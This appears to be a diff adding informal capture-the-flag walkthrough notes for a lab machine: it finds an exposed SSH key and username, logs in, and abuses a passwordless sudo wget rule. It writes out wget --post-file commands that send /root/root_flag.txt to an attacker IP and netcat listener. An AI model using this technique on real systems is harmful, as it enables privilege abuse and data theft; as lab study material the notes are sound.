@@ -42,3 +42,28 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /.htaccess.php (Status: 403)
 /.ssh (Status: 301)
 
+
+go to port 80
+find this in the comments:
+<!-- Jessie don't forget to udate the webiste -->
+
+use the .ssh key with that username
+
+chmod 600 key_rsa
+ssh -i key_rsa jessie@[ip]
+
+
+as jessie we ran sudo -l
+
+Matching Defaults entries for jessie on CorpOne:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jessie may run the following commands on CorpOne:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget
+
+sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.22.43.456:8000   - didnt work
+so isntead we had to send it to a nc listener
+
+sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.22.43.456:1234    - we got it
